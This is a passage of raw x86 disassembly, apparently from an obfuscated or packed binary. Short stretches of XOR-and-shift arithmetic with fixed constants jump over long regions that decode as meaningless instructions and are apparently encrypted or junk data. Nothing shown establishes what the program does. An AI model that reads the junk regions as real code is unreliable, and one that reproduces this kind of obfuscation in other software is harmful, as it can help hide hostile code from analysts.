  409be9:	mov    ecx,DWORD PTR [ebp-0x48]
  409bec:	mov    edx,DWORD PTR [ebp-0x44]
  409bef:	xor    eax,edi
  409bf1:	xor    edx,edx
  409bf3:	or     eax,edx
  409bf5:	add    eax,DWORD PTR ds:0x4225c8
  409bfb:	shl    ecx,0x1e
  409bfe:	mov    DWORD PTR [ebp+0x14],eax
  409c01:	mov    eax,DWORD PTR [ebp-0x48]
  409c04:	mov    ecx,DWORD PTR [ebp-0x44]
  409c07:	shrd   eax,ecx,0x2
  409c0b:	shr    ecx,0x2
  409c0e:	mov    ecx,DWORD PTR [ebp-0x48]
  409c11:	mov    edx,DWORD PTR [ebp-0x44]
  409c14:	xor    eax,edi
  409c16:	shl    ecx,0x1e
  409c19:	xor    edx,edx
  409c1b:	or     eax,edx
  409c1d:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  409c21:	mov    eax,DWORD PTR [ebp+0x14]
  409c24:	add    BYTE PTR [eax],cl
  409c26:	mov    eax,DWORD PTR [ebp-0x38]
  409c29:	mov    ecx,DWORD PTR [ebp-0x34]
  409c2c:	shrd   eax,ecx,0x2
  409c30:	shr    ecx,0x2
  409c33:	mov    ecx,DWORD PTR [ebp-0x38]
  409c36:	mov    edx,DWORD PTR [ebp-0x34]
  409c39:	xor    edx,edx
  409c3b:	xor    eax,edi
  409c3d:	or     eax,edx
  409c3f:	add    eax,DWORD PTR ds:0x4225c8
  409c45:	shl    ecx,0x1e
  409c48:	mov    ecx,DWORD PTR [ebp-0x38]
  409c4b:	mov    edx,DWORD PTR [ebp-0x34]
  409c4e:	shrd   ecx,edx,0x2
  409c52:	xor    ecx,edi
  409c54:	shr    edx,0x2
  409c57:	mov    edx,DWORD PTR [ebp-0x38]
  409c5a:	mov    edi,DWORD PTR [ebp-0x34]
  409c5d:	xor    edi,edi
  409c5f:	or     ecx,edi
  409c61:	mov    cl,BYTE PTR [ebp+ecx*1-0x4]
  409c65:	or     BYTE PTR [eax],cl
  409c67:	shl    edx,0x1e
  409c6a:	mov    edx,DWORD PTR [ebx]
  409c6c:	mov    eax,DWORD PTR [ebx+0x4]
  409c6f:	mov    edi,DWORD PTR [ebx]
  409c71:	mov    ecx,DWORD PTR [ebx+0x4]
  409c74:	xor    edx,0xca79a577
  409c7a:	xor    eax,0x9c1b89e8
  409c7f:	shrd   edx,eax,0x2
  409c83:	xor    ecx,ecx
  409c85:	or     ecx,edx
  409c87:	mov    DWORD PTR [ebp+0x8],ecx
  409c8a:	mov    ecx,DWORD PTR [esi]
  409c8c:	mov    edx,DWORD PTR [esi+0x4]
  409c8f:	xor    edx,0x9c1b89e8
  409c95:	xor    ecx,0xca79a577
  409c9b:	mov    DWORD PTR [ebp+0x14],ecx
  409c9e:	mov    ecx,edx
  409ca0:	mov    edx,DWORD PTR [ebp+0x14]
  409ca3:	shrd   edx,ecx,0x2
  409ca7:	shr    eax,0x2
  409caa:	shl    edi,0x1e
  409cad:	mov    DWORD PTR [ebp-0x6c],eax
  409cb0:	mov    DWORD PTR [ebp-0x70],edx
  409cb3:	mov    edx,DWORD PTR [esi]
  409cb5:	mov    eax,0x40000000
  409cba:	xor    edi,eax
  409cbc:	or     edi,DWORD PTR [ebp-0x6c]
  409cbf:	mov    DWORD PTR [ebp+0x14],edx
  409cc2:	shl    DWORD PTR [ebp+0x14],0x1e
  409cc6:	xor    DWORD PTR [ebp+0x14],eax
  409cc9:	mov    DWORD PTR [ebp+0xc],edi
  409ccc:	jmp    0x40a0aa
  409cd1:	jbe    0x409d4e
  409cd3:	fstp   TBYTE PTR [edx+ebx*8-0x78e4c9e4]
  409cda:	ins    DWORD PTR es:[edi],dx
  409cdb:	cmp    DWORD PTR [eax+eiz*2+0x36],0xffffffd7
  409ce0:	mov    esp,0x181839cd
  409ce5:	sahf   
  409ce6:	adc    bl,BYTE PTR [eax]
  409ce8:	sbb    BYTE PTR [eax+0x67],ah
  409ceb:	pop    ss
  409cec:	loope  0x409d2f
  409cee:	cs int 0x70
  409cf1:	lock pusha 
  409cf3:	inc    ebp
  409cf4:	jb     0x409d4c
  409cf6:	pop    esp
  409cf7:	scas   eax,DWORD PTR es:[edi]
  409cf8:	sbb    eax,0x637ae9c2
  409cfd:	ret    0x8259
  409d00:	jb     0x409cbd
  409d02:	jp     0x409c89
  409d04:	push   esi
  409d05:	cld    
  409d06:	xchg   BYTE PTR [eax-0x2a4693b0],bh
  409d0c:	cs in  eax,dx
  409d0e:	pop    ebp
  409d0f:	xlat   BYTE PTR ds:[ebx]
  409d10:	xchg   ah,cl
  409d12:	inc    esi
  409d13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d14:	dec    ecx
  409d15:	popa   
  409d16:	and    dh,BYTE PTR [ecx]
  409d18:	sbb    DWORD PTR [ecx-0x4a9b0c9],ecx
  409d1e:	fstp   TBYTE PTR [ebp-0x7b]
  409d21:	inc    BYTE PTR [edi-0x6e184562]
  409d27:	lock cmp BYTE PTR [ebx],bh
  409d2a:	pushf  
  409d2b:	aad    0xf5
  409d2d:	mov    ds:0x8d409da2,eax
  409d32:	mov    eax,fs
  409d34:	inc    ebp
  409d35:	push   es
  409d36:	sub    eax,0x2c13725e
  409d3b:	pop    ss
  409d3c:	(bad)  
  409d3d:	lock iret 
  409d3f:	popf   
  409d40:	stc    
  409d41:	add    DWORD PTR [eax-0x699a049d],edx
  409d47:	mov    cs,ebp
  409d49:	cwde   
  409d4a:	pop    eax
  409d4b:	or     dh,ch
  409d4d:	jmp    0xe9:0xe1d1613a
  409d54:	paddsw mm3,QWORD PTR [ecx+0x64]
  409d58:	sub    edi,0x53b81705
  409d5e:	pushf  
  409d5f:	adc    al,0x73
  409d61:	mov    ds:0xc3075fe1,eax
  409d66:	push   0xf2a2acb1
  409d6b:	push   ebp
  409d6c:	rcl    BYTE PTR [edx+0x1f4bb8a3],cl
  409d72:	(bad)  
  409d73:	outs   dx,DWORD PTR ds:[esi]
  409d74:	xchg   edx,ecx
  409d76:	loop   0x409d23
  409d78:	(bad)  [ebx+0x71]
  409d7b:	add    al,BYTE PTR [ebp-0x68fae6a7]
  409d81:	aam    0xab
  409d83:	lds    ecx,FWORD PTR [edi-0xb6327d1]
  409d89:	sahf   
  409d8a:	dec    ebp
  409d8b:	jg     0x409e09
  409d8d:	fadd   DWORD PTR [edi]
  409d8f:	call   0xbd21:0x6bffbf30
  409d96:	test   al,0xfa
  409d98:	aaa    
  409d99:	pop    esi
  409d9a:	mov    ecx,0x39e5ca17
  409d9f:	aaa    
  409da0:	push   ss
  409da1:	sbb    al,0x3
  409da3:	push   ecx
  409da4:	mov    ebp,0xe4ea5a39
  409da9:	sahf   
  409daa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409dab:	dec    ecx
  409dac:	jmp    0x409dfe
  409dae:	jle    0x409dac
  409db0:	(bad)  
  409db1:	mov    ecx,DWORD PTR [ecx+0x60]
  409db4:	cmp    DWORD PTR [edx],esi
  409db6:	test   al,0x87
  409db8:	sbb    al,0x22
  409dba:	(bad)  
  409dbb:	jge    0x409ddd
  409dbd:	nop
  409dbe:	dec    ebx
  409dbf:	or     eax,0x5acbfe82
  409dc4:	sbb    dl,BYTE PTR [esi]
  409dc6:	push   ds
  409dc7:	mov    al,0x67
  409dc9:	sbb    ecx,ebx
  409dcb:	mov    esi,0xa4392af2
  409dd0:	mov    esi,0x6a2c2b29
  409dd5:	xchg   ebp,eax
  409dd6:	mov    ch,0x10
  409dd8:	pop    es
  409dd9:	push   ds
  409dda:	and    al,ah
  409ddc:	xor    BYTE PTR [ecx-0x4d7c4e1f],dh
  409de2:	cdq    
  409de3:	repnz mov dh,0x10
  409de6:	mov    WORD PTR [ecx-0x19],?
  409de9:	mov    ecx,0x3dd804ba
  409dee:	push   ebp
  409def:	in     eax,dx
  409df0:	xchg   edi,eax
  409df1:	es mov esp,0x1f660b40
  409df7:	and    BYTE PTR [edx-0x4e],dl
  409dfa:	jo     0x409df4
  409dfc:	push   eax
  409dfd:	loopne 0x409e3b
  409dff:	xchg   edi,eax
  409e00:	and    dh,dl
  409e02:	iret   
  409e03:	or     eax,0xa4203562
  409e08:	shl    cl,1
  409e0a:	xchg   edi,eax
  409e0b:	stos   BYTE PTR es:[edi],al
  409e0c:	fnsave [edx]
  409e0e:	sbb    bl,BYTE PTR [edx+edi*4]
  409e11:	jecxz  0x409e92
  409e13:	lock cmp esi,edx
  409e16:	cwde   
  409e17:	mov    ds:0x82e5ba91,eax
  409e1c:	mov    ebp,0x4edb6749
  409e21:	das    
  409e22:	dec    esp
  409e23:	mov    ebx,0x8738c2dc
  409e28:	or     ebp,DWORD PTR [edi-0x41]
  409e2b:	xor    al,0x42
  409e2d:	and    ecx,DWORD PTR [ecx]
  409e2f:	dec    esi
  409e30:	fnstsw WORD PTR [edi]
  409e32:	int3   
  409e33:	stos   BYTE PTR es:[edi],al
  409e34:	cli    
  409e35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e36:	stos   DWORD PTR es:[edi],eax
  409e37:	aad    0xe5
  409e39:	ret    0xe2d3
  409e3c:	sbb    DWORD PTR [ecx+0x51eaa1fa],eax
  409e42:	adc    al,0x98
  409e44:	stos   DWORD PTR es:[edi],eax
  409e45:	sub    esp,DWORD PTR [edx+0x3f]
  409e48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e49:	mov    al,0x64
  409e4b:	loopne 0x409e5f
  409e4d:	or     BYTE PTR [edx+0x53a21020],ah
  409e53:	lods   eax,DWORD PTR ds:[esi]
  409e54:	popf   
  409e55:	or     eax,0x7e564eeb
  409e5a:	or     eax,0x5be222f8
  409e5f:	call   0xcbf11b08
  409e64:	es or  eax,0x8cc8aec
  409e6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e6b:	pusha  
  409e6c:	mov    al,0x3a
  409e6e:	int3   
  409e6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e70:	inc    edi
  409e71:	sub    BYTE PTR [esi+0xa],bl
  409e74:	fdiv   st(2),st
  409e76:	icebp  
  409e77:	aas    
  409e78:	mov    ebx,0x4bde3d1e
  409e7d:	ret    0x3314
  409e80:	inc    esp
  409e81:	pop    edx
  409e82:	loop   0x409ed2
  409e84:	add    al,0xe
  409e86:	sti    
  409e87:	dec    ebx
  409e88:	das    
  409e89:	pop    edi
  409e8a:	xchg   esp,eax
  409e8b:	call   0x5f37:0xd3c13169
  409e92:	jne    0x409eaa
  409e94:	or     esp,edi
  409e96:	js     0x409e2e
  409e98:	push   ss
  409e99:	fs dec esi
  409e9b:	xlat   BYTE PTR ds:[ebx]
  409e9c:	mov    al,ds:0xa9ab57eb
  409ea1:	push   ebp
  409ea2:	push   esp
  409ea3:	cli    
  409ea4:	sbb    edx,DWORD PTR [ebx-0x42]
  409ea7:	(bad)  
  409ea8:	fisttp QWORD PTR [ecx+0x4a0e152]
  409eae:	inc    ebp
  409eaf:	fwait
  409eb0:	pop    es
  409eb1:	sahf   
  409eb2:	push   0x9dc59578
  409eb7:	cmp    esp,esp
  409eb9:	inc    esp
  409eba:	mov    edx,edx
  409ebc:	jg     0x409e3e
  409ebe:	cmp    esp,eax
  409ec0:	je     0x409eee
  409ec2:	ss push 0x7cb43f39
  409ec8:	sub    DWORD PTR [esi-0x2b],esi
  409ecb:	lds    ebp,FWORD PTR [edx-0x1f]
  409ece:	in     eax,dx
  409ecf:	inc    ecx
  409ed0:	sub    al,0xc0
  409ed2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ed3:	inc    esi
  409ed4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ed5:	jo     0x409f4d
  409ed7:	dec    ebx
  409ed8:	das    
  409ed9:	int3   
  409eda:	inc    edx
  409edb:	push   esi
  409edc:	mov    ds:0xc50b1955,eax
  409ee1:	push   esi
  409ee2:	add    al,0xa2
  409ee4:	xor    ecx,esi
  409ee6:	mov    ecx,0xb3796b2c
  409eeb:	loop   0x409e9a
  409eed:	xchg   edi,eax
  409eee:	(bad)  
  409eef:	pop    ss
  409ef0:	scas   al,BYTE PTR es:[edi]
  409ef1:	or     ah,BYTE PTR [edx]
  409ef3:	xchg   ebp,eax
  409ef4:	xor    eax,0x858d1bc3
  409ef9:	sbb    eax,0x92f222db
  409efe:	xor    bh,BYTE PTR [ebp+0x64]
  409f01:	push   eax
  409f02:	imul   ebp,DWORD PTR [ebx*8-0x7532bec2],0xc579875
  409f0d:	sub    bh,BYTE PTR [edx-0x5f]
  409f10:	dec    esi
  409f11:	cmp    DWORD PTR [esi+0x1c],esp
  409f14:	sahf   
  409f15:	in     al,0x27
  409f17:	jbe    0x409eae
  409f19:	add    BYTE PTR [edx+0x30],dh
  409f1c:	sub    esi,DWORD PTR [ecx+0x14a9ec9e]
  409f22:	cwde   
  409f23:	add    DWORD PTR [edx],eax
  409f25:	cmp    eax,0x18878f63
  409f2a:	call   0xf2239fe8
  409f2f:	rol    DWORD PTR [ebp-0x70f00b17],cl
  409f35:	mov    eax,ds:0xc69b78c4
  409f3a:	lahf   
  409f3b:	adc    al,0x11
  409f3d:	pop    edi
  409f3e:	es jbe 0x409f40
  409f41:	shld   DWORD PTR [ebx-0xc31a978],eax,cl
  409f48:	sub    BYTE PTR [edx+0x73],bh
  409f4b:	mov    edx,0x74a9e598
  409f50:	pop    eax
  409f51:	shr    ebp,cl
  409f53:	pusha  
  409f54:	jp     0x409f31
  409f56:	nop
  409f57:	sbb    al,0xe5
  409f59:	adc    eax,0xc980f88a
  409f5e:	jne    0x409ef3
  409f60:	(bad)  
  409f62:	int3   
  409f63:	fbld   TBYTE PTR [ecx-0x40]
  409f66:	out    0xe5,eax
  409f68:	mov    DWORD PTR [esi-0x4f7e5986],edi
  409f6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f6f:	inc    edi
  409f70:	icebp  
  409f71:	jo     0x409f27
  409f73:	or     al,0x4f
  409f75:	add    dl,0xfc
  409f78:	add    cl,BYTE PTR [esi+0x182389ac]
  409f7e:	add    bh,BYTE PTR [ebx+0x5b]
  409f81:	add    edx,edi
  409f83:	ret    
  409f84:	mov    esp,0x214d1ab9
  409f89:	adc    al,0x49
  409f8b:	es in  al,dx
  409f8d:	sti    
  409f8e:	cs pop edx
  409f90:	sbb    dh,ah
  409f92:	fadd   DWORD PTR [esi-0x54]
  409f95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f96:	push   edi
  409f97:	adc    ch,BYTE PTR [ebx+ecx*1]
  409f9a:	retf   0xc8d3
  409f9d:	jns    0x409f57
  409f9f:	daa    
  409fa0:	lds    esi,FWORD PTR [ebp+esi*8-0x60875a91]
  409fa7:	xor    eax,0xaab7351c
  409fac:	sti    
  409fad:	xchg   ecx,eax
  409fae:	adc    DWORD PTR [ebx],0xc347965d
  409fb4:	and    al,bl
  409fb6:	pushf  
  409fb7:	xor    esp,esi
  409fb9:	scas   eax,DWORD PTR es:[edi]
  409fba:	add    al,BYTE PTR [ecx-0x5d]
  409fbd:	mov    ah,0xa2
  409fbf:	and    ch,BYTE PTR [ebx+edi*8+0x17]
  409fc3:	sub    al,0x1
  409fc5:	dec    ebx
  409fc6:	mov    ebx,0xc907cfc7
  409fcb:	fimul  DWORD PTR [ebx+0x7e50d5ce]
  409fd1:	imul   ebx,DWORD PTR [edx+0x6b3deae1],0x5c
  409fd8:	inc    esp
  409fd9:	push   ebx
  409fda:	je     0x409fe8
  409fdc:	dec    ebx
  409fdd:	xor    edx,DWORD PTR ds:0x374d743e
  409fe3:	lds    ebp,FWORD PTR [edi+0x48]
  409fe6:	xchg   esi,eax
  409fe7:	add    BYTE PTR [edi-0x4a418db5],cl
  409fed:	aas    
  409fee:	pop    esi
  409fef:	js     0x409fda
  409ff1:	pop    edi
  409ff2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ff3:	xor    BYTE PTR [edx],0x76
  409ff6:	mov    esi,0x7c993792
  409ffb:	mov    dh,0xd1
  409ffd:	aas    
  409ffe:	adc    bh,BYTE PTR [edx]
  40a000:	jno    0x409fe3
  40a002:	imul   ebp,DWORD PTR [ecx],0xc96715fb
  40a008:	or     edx,esp
  40a00a:	enter  0xb63e,0x80
  40a00e:	mov    al,0x8d
  40a010:	xor    ecx,eax
  40a012:	and    BYTE PTR ds:0xa1842afc,0x8d
  40a019:	ss (bad) 
  40a01b:	in     eax,dx
  40a01c:	mov    ebx,0x286788ef
  40a021:	test   DWORD PTR [esi-0x7df6d463],edx
  40a027:	repz cmp edx,0xffffff97
  40a02b:	xor    ah,bh
  40a02d:	push   cs
  40a02e:	sub    ebp,DWORD PTR [esi+0x5c]
  40a031:	dec    esi
  40a032:	stos   DWORD PTR es:[edi],eax
  40a033:	jns    0x409fbe
  40a035:	retf   
  40a036:	outs   dx,BYTE PTR ds:[esi]
  40a037:	xchg   edi,eax
  40a038:	sbb    eax,0x536b544b
  40a03d:	mov    ebx,0x608eb7bb
  40a042:	mov    al,ds:0xce61573f
  40a047:	dec    edx
  40a048:	pop    ebp
  40a049:	add    al,0x20
  40a04b:	jo     0x409fd8
  40a04d:	cs push edi
  40a04f:	pop    ecx
  40a050:	cmp    eax,0x3c25cd81
  40a055:	xchg   esp,eax
  40a056:	out    dx,eax
  40a057:	imul   edi,DWORD PTR [eax-0x23eac989],0x14
  40a05e:	lock jge 0x40a0d7
  40a061:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a062:	and    ch,BYTE PTR [ecx+0x20]
  40a065:	nop
  40a066:	popa   
  40a067:	sar    ecx,1
  40a069:	fcom   QWORD PTR [esi]
  40a06b:	jmp    0x1e12:0x3abaae00
  40a072:	inc    esp
  40a073:	push   ss
  40a074:	jbe    0x40a02d
  40a076:	loop   0x40a06b
  40a078:	jbe    0x40a0ba
  40a07a:	inc    ebp
  40a07b:	sbb    al,0x9e
  40a07d:	fsub   DWORD PTR [ebp-0x2d059ff4]
  40a083:	fadd   QWORD PTR [esi+0x38e494b9]
  40a089:	xchg   esp,eax
  40a08a:	adc    DWORD PTR [edi-0x3c],edx
  40a08d:	or     dl,bh
  40a08f:	push   cs
  40a090:	mov    ds:0xcd7f45be,eax
  40a095:	dec    edx
  40a096:	mov    ebx,0x4e4b8adb
  40a09b:	data16 int 0xc1
  40a09e:	push   esi
  40a09f:	dec    ecx
  40a0a0:	push   0x6a30efb3
  40a0a5:	sar    DWORD PTR [ebp-0x749cf73c],cl
  40a0ab:	jle    0x40a0b1
  40a0ad:	mov    edi,DWORD PTR [ebp+0x14]
  40a0b0:	xor    edx,edx
  40a0b2:	or     edx,DWORD PTR [ebp-0x70]
  40a0b5:	shr    ecx,0x2
  40a0b8:	or     edi,ecx
  40a0ba:	cmp    edx,DWORD PTR [ebp+0x8]
  40a0bd:	jne    0x40a9b0
  40a0c3:	cmp    edi,DWORD PTR [ebp+0xc]
  40a0c6:	jne    0x40a9b0
  40a0cc:	jmp    0x40a926
  40a0d1:	mov    eax,DWORD PTR [esi]
  40a0d3:	mov    edx,DWORD PTR [esi+0x4]
  40a0d6:	mov    eax,DWORD PTR [esi]
  40a0d8:	mov    edx,DWORD PTR [esi+0x4]
  40a0db:	xor    eax,0xca79a577
  40a0e0:	xor    edx,ecx
  40a0e2:	mov    ecx,eax
  40a0e4:	mov    eax,edx
  40a0e6:	shrd   ecx,eax,0x2
  40a0ea:	shr    eax,0x2
  40a0ed:	mov    DWORD PTR [ebp+0xc],eax
  40a0f0:	mov    eax,DWORD PTR [esi]
  40a0f2:	mov    edx,DWORD PTR [esi+0x4]
  40a0f5:	mov    edx,eax
  40a0f7:	xor    eax,eax
  40a0f9:	or     eax,ecx
  40a0fb:	mov    ecx,DWORD PTR [ebx]
  40a0fd:	shl    edx,0x1e
  40a100:	xor    edx,0x40000000
  40a106:	mov    DWORD PTR [ebp+0x10],eax
  40a109:	mov    eax,edx
  40a10b:	or     eax,DWORD PTR [ebp+0xc]
  40a10e:	mov    edx,DWORD PTR [ebx+0x4]
  40a111:	push   eax
  40a112:	push   DWORD PTR [ebp+0x10]
  40a115:	push   edx
  40a116:	push   ecx
  40a117:	jmp    0x40a4f5
  40a11c:	std    
  40a11d:	dec    ecx
  40a11e:	mov    ah,0xd2
  40a120:	sub    al,0x22
  40a122:	fidivr DWORD PTR [edi]
  40a124:	test   al,0x29
  40a126:	push   ebp
  40a127:	stos   BYTE PTR es:[edi],al
  40a128:	dec    ebx
  40a129:	add    ebx,DWORD PTR [ebx+0x18335270]
  40a12f:	sbb    BYTE PTR [esi-0x48e7e7ee],bl
  40a135:	mov    dl,0x28
  40a137:	xor    BYTE PTR [esi-0xe],cl
  40a13a:	xchg   BYTE PTR [ebp-0x33],bh
  40a13d:	retf   0x140d
  40a140:	aad    0x7f
  40a142:	(bad)  
  40a144:	(bad)  [eax]
  40a146:	call   DWORD PTR [edi]
  40a148:	inc    esi
  40a149:	js     0x40a178
  40a14b:	xchg   edx,eax
  40a14c:	clc    
  40a14d:	dec    edx
  40a14e:	outs   dx,BYTE PTR ds:[esi]
  40a14f:	outs   dx,BYTE PTR ds:[esi]
  40a150:	xor    BYTE PTR [ebx],al
  40a152:	ret    
  40a153:	out    dx,eax
  40a154:	adc    cl,dl
  40a156:	fs jmp 0x40a15e
  40a159:	sahf   
  40a15a:	dec    ebx
  40a15b:	lods   eax,DWORD PTR ds:[esi]
  40a15c:	dec    ebp
  40a15d:	(bad)  
  40a15e:	lock cmc 
  40a160:	push   edi
  40a161:	jns    0x40a168
  40a163:	cmp    eax,0xd430edea
  40a168:	pandn  mm1,QWORD PTR [edx]
  40a16b:	pop    edi
  40a16c:	push   DWORD PTR [edi+0x51365041]
  40a172:	xor    BYTE PTR [eax],dh
  40a174:	or     eax,0xe869980
  40a179:	push   ds
  40a17a:	jge    0x40a127
  40a17c:	mov    eax,0x7c2edb44
  40a181:	inc    eax
  40a182:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a183:	xchg   ebp,eax
  40a184:	adc    esp,DWORD PTR [edx+eiz*1]
  40a187:	dec    esi
  40a188:	out    dx,al
  40a189:	sahf   
  40a18a:	inc    ebp
  40a18b:	cmp    eax,ecx
  40a18d:	or     eax,0xa827902f
  40a192:	jb     0x40a124
  40a194:	dec    ebp
  40a195:	ins    DWORD PTR es:[edi],dx
  40a196:	cmp    DWORD PTR [edx+0x6237af35],ecx
  40a19c:	pop    eax
  40a19d:	lods   eax,DWORD PTR ds:[esi]
  40a19e:	std    
  40a19f:	or     dl,BYTE PTR [esi+0x723088a5]
  40a1a5:	out    dx,eax
  40a1a6:	xor    al,0x76
  40a1a8:	out    0xc1,eax
  40a1aa:	stos   DWORD PTR es:[edi],eax
  40a1ab:	adc    eax,0x7b7122e7
  40a1b0:	dec    eax
  40a1b1:	mov    ch,0x41
  40a1b3:	jecxz  0x40a1ab
  40a1b5:	xor    eax,0x7189e448
  40a1ba:	ror    BYTE PTR [ecx+0x5e91fd30],cl
  40a1c0:	rcr    DWORD PTR [ecx-0x479a0140],1
  40a1c6:	leave  
  40a1c7:	out    dx,eax
  40a1c8:	mov    bl,0x34
  40a1ca:	loope  0x40a232
  40a1cc:	ss test al,0x7e
  40a1cf:	pushf  
  40a1d0:	fwait
  40a1d1:	in     al,0x56
  40a1d3:	test   BYTE PTR [eax+0x61],ch
  40a1d6:	pop    ss
  40a1d7:	arpl   di,bx
  40a1d9:	mov    esp,0x166d5b94
  40a1de:	pop    ebx
  40a1df:	pop    ecx
  40a1e0:	push   ecx
  40a1e1:	jbe    0x40a249
  40a1e3:	xor    BYTE PTR [edx-0x69],cl
  40a1e6:	and    DWORD PTR [esi-0x750b656a],edx
  40a1ec:	push   0x65
  40a1ee:	jge    0x40a251
  40a1f0:	ror    DWORD PTR [edi+0x590345d8],1
  40a1f6:	(bad)  
  40a1f7:	add    eax,0x25ae0548
  40a1fc:	aam    0x2b
  40a1fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1ff:	and    edx,DWORD PTR [edi+0x10a6f977]
  40a205:	inc    edi
  40a206:	inc    esp
  40a207:	test   DWORD PTR [esi],ebx
  40a209:	inc    ecx
  40a20a:	daa    
  40a20b:	mov    eax,ds:0xfd48ec85
  40a210:	xchg   ebp,eax
  40a211:	or     ah,dl
  40a213:	ds jnp 0x40a19f
  40a216:	cdq    
  40a217:	stc    
  40a218:	dec    esi
  40a21a:	inc    esp
  40a21b:	imul   eax,DWORD PTR [edi],0x50b9eb36
  40a221:	fcmovnu st,st(5)
  40a223:	pop    es
  40a224:	and    ebx,esi
  40a226:	mov    eax,0xa9882f06
  40a22b:	out    dx,al
  40a22c:	add    DWORD PTR [esi],0xc
  40a22f:	xor    BYTE PTR [ebx-0x11b395f9],cl
  40a235:	fwait
  40a236:	inc    ebx
  40a237:	repnz inc esp
  40a239:	sbb    ah,BYTE PTR [ecx]
  40a23b:	add    DWORD PTR [ecx-0x6dadf587],esi
  40a241:	fcmovbe st,st(7)
  40a243:	sbb    BYTE PTR [edx-0x6c49430c],bh
  40a249:	je     0x40a218
  40a24b:	dec    esp
  40a24c:	call   0x12238c8b
  40a251:	pop    ds
  40a252:	xor    DWORD PTR [ebx-0x62e9f7d8],esp
  40a258:	sbb    BYTE PTR [edi+0x4d],al
  40a25b:	test   eax,0x663b6da0
  40a260:	adc    DWORD PTR [eax+edi*4+0x5d2e8232],ebp
  40a267:	xor    al,0x46
  40a269:	and    ah,ah
  40a26b:	add    esi,DWORD PTR [edi]
  40a26d:	adc    BYTE PTR [esi+0x1537a9fe],0x76
  40a274:	jp     0x40a23f
  40a276:	imul   esi,DWORD PTR [edx-0x71],0x79a034a7
  40a27d:	loop   0x40a237
  40a27f:	call   0x20a3907c
  40a284:	in     al,dx
  40a285:	call   0x1a39:0xee4fea46
  40a28c:	(bad)  
  40a28d:	cmc    
  40a28e:	pop    edx
  40a28f:	xor    BYTE PTR [esi],0x6f
  40a292:	in     al,dx
  40a293:	add    DWORD PTR [ebx+0x13617e7c],eax
  40a299:	mov    ds:0xbf70cfeb,eax
  40a29e:	nop
  40a29f:	clc    
  40a2a0:	cli    
  40a2a1:	jo     0x40a24c
  40a2a3:	pop    ss
  40a2a4:	shl    eax,1
  40a2a6:	rol    DWORD PTR [edi+0x18ffc79d],cl
  40a2ac:	mov    BYTE PTR [eax],cl
  40a2ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2af:	jns    0x40a29f
  40a2b1:	in     eax,0x11
  40a2b3:	pop    ebp
  40a2b4:	push   0xcad24312
  40a2b9:	sub    eax,0x77890207
  40a2be:	jo     0x40a2c1
  40a2c0:	xchg   esp,eax
  40a2c1:	jle    0x40a273
  40a2c3:	repz jmp 0x412da55c
  40a2c9:	in     eax,0xf0
  40a2cb:	inc    ebp
  40a2cc:	xlat   BYTE PTR ds:[ebx]
  40a2cd:	das    
  40a2ce:	test   DWORD PTR [ebx-0x195b474d],esi
  40a2d4:	mov    esp,edi
  40a2d6:	jp     0x40a28f
  40a2d8:	fcmovu st,st(3)
  40a2da:	jle    0x40a28d
  40a2dc:	pop    ss
  40a2dd:	jb     0x40a2be
  40a2df:	rcr    ch,cl
  40a2e1:	out    0x6d,eax
  40a2e3:	sub    BYTE PTR [edx-0x4543caf],0xa4
  40a2ea:	popf   
  40a2eb:	pop    esp
  40a2ec:	outs   dx,DWORD PTR ds:[esi]
  40a2ed:	sbb    DWORD PTR [eax+0x45],ebp
  40a2f0:	mov    edi,0x744d6bba
  40a2f5:	push   edx
  40a2f6:	and    al,cl
  40a2f8:	add    BYTE PTR [esi],cl
  40a2fa:	mov    BYTE PTR [edi+0x0],bl
  40a2fd:	jae    0x40a365
  40a2ff:	adc    al,0x9
  40a301:	and    al,0x8e
  40a303:	addr16 int 0x4a
  40a306:	dec    ebp
  40a307:	pop    ebp
  40a308:	das    
  40a309:	fist   WORD PTR [edi-0x541a2006]
  40a30f:	cmp    DWORD PTR [edi-0x3c],0xe1293d36
  40a316:	jle    0x40a2bf
  40a318:	mov    esi,0xc0822c31
  40a31d:	mov    dh,0xeb
  40a31f:	(bad)  
  40a320:	fmul   QWORD PTR [edi+0x69b1a31c]
  40a326:	adc    al,0x95
  40a328:	xor    eax,0xefca490c
  40a32d:	fwait
  40a32e:	jae    0x40a31e
  40a330:	iret   
  40a331:	lods   eax,DWORD PTR ds:[esi]
  40a332:	ins    DWORD PTR es:[edi],dx
  40a333:	lea    edi,ds:0x549d1062
  40a339:	mov    ds:0xd0a257e1,al
  40a33e:	cmp    DWORD PTR [ecx+eax*1],edx
  40a341:	sbb    BYTE PTR [esi],0xaa
  40a344:	lock test esp,ebp
  40a347:	adc    bh,BYTE PTR ds:0x81f78181
  40a34d:	in     al,dx
  40a34e:	popa   
  40a34f:	or     eax,eax
  40a351:	cmp    al,0x70
  40a353:	clc    
  40a354:	cmp    bh,dl
  40a356:	pushf  
  40a357:	sub    BYTE PTR [esi],cl
  40a359:	iret   
  40a35a:	mov    bh,0x54
  40a35c:	mov    bl,0x9
  40a35e:	rcl    BYTE PTR [edi+0x78],1
  40a361:	pop    edi
  40a362:	or     bh,dl
  40a364:	pop    edx
  40a365:	mov    bh,0x97
  40a367:	mov    esi,0x73581d6b
  40a36c:	in     eax,dx
  40a36d:	scas   al,BYTE PTR es:[edi]
  40a36e:	cmp    eax,DWORD PTR [ecx-0x58]
  40a371:	icebp  
  40a372:	sahf   
  40a373:	stos   DWORD PTR es:[edi],eax
  40a374:	idiv   DWORD PTR [edi+0x2c]
  40a377:	fild   QWORD PTR [ebx+0xb30583a]
  40a37d:	xor    eax,0xb56baf2f
